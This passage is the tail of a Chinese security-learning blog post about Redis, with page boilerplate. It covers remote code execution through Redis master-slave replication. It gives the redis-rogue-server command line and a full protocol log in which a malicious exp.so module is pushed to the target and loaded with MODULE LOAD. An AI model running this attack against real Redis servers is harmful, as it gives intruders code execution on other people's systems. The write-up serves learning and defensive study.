+<span class="token constant">MODULE</span> <span class="token constant">LOAD</span>　加载模块    
+<span class="token constant">SLAVEOF</span> <span class="token constant">NO</span> <span class="token constant">ONE</span>　解除主从关系  </code></pre>
+<p>工具：<code>https://github.com/Dliv3/redis-rogue-server</code></p>
+<p>python3 redis-rogue-server.py –rhost 172.17.0.3 –rport 6379 –lhost 172.17.0.1 –lport 6381</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/ICLDmvbO2pS8utq.png" alt="26.png"></p>
+<pre class=" language-php"><code class="language-php"><span class="token constant">BINDING</span> <span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token punctuation">:</span><span class="token number">6381</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$7\r\nSLAVEOF\r\n$10\r\n172.17.0.1\r\n$4\r\n6381\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'+OK\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$10\r\ndbfilename\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'*2\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$3\r\ndir\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'*2\r\n$3\r\ndir\r\n$5\r\n/data\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$6\r\nexp.so\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'+OK\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'*1\r\n$4\r\nPING\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'+PONG\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$8\r\nREPLCONF\r\n$14\r\nlistening-port\r\n$4\r\n6379\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'+OK\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'*5\r\n$8\r\nREPLCONF\r\n$4\r\ncapa\r\n$3\r\neof\r\n$4\r\ncapa\r\n$6\r\npsync2\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'+OK\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$5\r\nPSYNC\r\n$40\r\n0dcbe9ddfebed3f8033b0980bb22c4d84c4336e0\r\n$3\r\n303\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'+FULLRESYNC ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ 1\r\n$38336\r\n\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>b<span class="token string">'\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x81\x00\x00\x00\x00\x00\x00r\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$6\r\nMODULE\r\n$4\r\nLOAD\r\n$12\r\n/data/exp.so\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'+OK\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">-</span><span class="token punctuation">]</span> b<span class="token string">'*3\r\n$7\r\nSLAVEOF\r\n$2\r\nNO\r\n$3\r\nONE\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">]</span> b<span class="token string">'+OK\r\n'</span>
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token punctuation">]</span> 
+</code></pre>
+<p>连上去看可不可以执行命令</p>
+<p><img src="/media/play-zg/ABDEF9E6CCF021C8/hexo/source/images/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/RyfOZ7WFgr6kJI5.png" alt="30.png"></p>
+<p>参考：</p>
+<p><code>https://www.freebuf.com/articles/web/227309.html</code></p>
+<p><code>https://xz.aliyun.com/t/5665#toc-6</code></p>
+<p><code>https://www.anquanke.com/post/id/181734</code></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">PlayZG</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2021/01/24/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">http://example.com/2021/01/24/redis%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">PlayZG</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/redis/">
+                                    <span class="chip bg-color">redis</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/01/24/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="PHP伪随机数">
+                        
+                        <span class="card-title">PHP伪随机数</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-24
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            PlayZG
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PHP%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/">
+                        <span class="chip bg-color">PHP伪随机数</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/01/24/FLASK%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI-%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="FLASK模板注入(SSTI)学习">
+                        
+                        <span class="card-title">FLASK模板注入(SSTI)学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-24
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            PlayZG
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/FLASK%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI-%E5%AD%A6%E4%B9%A0/">
+                        <span class="chip bg-color">FLASK模板注入(SSTI)学习</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + '来源: Hexo<br />'
+            + '文章作者: John Doe<br />'
+            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2021</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">152.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/playZG" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:playzg@aliyun.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1351802079" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1351802079" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
